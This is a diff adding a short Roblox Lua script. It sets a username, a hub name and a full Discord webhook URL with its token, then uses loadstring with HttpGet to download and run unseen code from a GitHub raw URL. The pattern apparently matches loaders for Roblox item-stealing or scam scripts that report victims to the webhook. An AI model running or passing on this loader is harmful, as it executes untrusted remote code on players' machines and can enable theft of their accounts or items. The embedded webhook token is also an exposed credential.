@@ -1,0 +1,5 @@
+_G.Username = "Achrid08"
+_G.HubName = ".gg/visualscript"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1098608141542891631/akMByVvrA5MB9VUmFmKmUhsAEq-Z983l_JSFS6T1bZWwofp98pzK6RQRLGaUy1g4IyAc"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
